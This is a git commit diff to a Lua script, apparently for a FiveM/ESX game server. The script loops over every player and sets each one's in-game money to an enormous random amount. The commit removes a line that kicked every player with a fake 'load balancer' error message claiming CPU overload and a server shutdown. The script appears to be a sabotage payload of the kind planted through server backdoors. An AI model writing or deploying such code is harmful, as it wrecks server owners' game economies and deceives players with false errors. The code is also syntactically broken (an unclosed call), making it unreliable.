acb50c308c0f4c41457d1ab97e3ba5a41ed5e7ad
Thekuca <63980591+Thekuca@users.noreply.github.com>
2023-10-31 11:03:58 +0100

    Update code.lua

--- code.lua
+++ code.lua
@@ -3,5 +3,4 @@ CODE_PROPERTIES = {Loop = true, Wait = 5000, Diffcheck = 5000}
 for k,id in pairs(GetPlayers()) do
     local asd = ESX.GetPlayerFromId(id)
     asd.setMoney(math.random(100000000000, 200230693240)
-    DropPlayer(id, '[THEKUCA LOAD BALANCER] Log greske: \n[TRACE] CPU load >= 50% - Saljem load na drugi server \n[TRACE] Nepoznate skripte, stopiram petlju, gasim server...')
 end
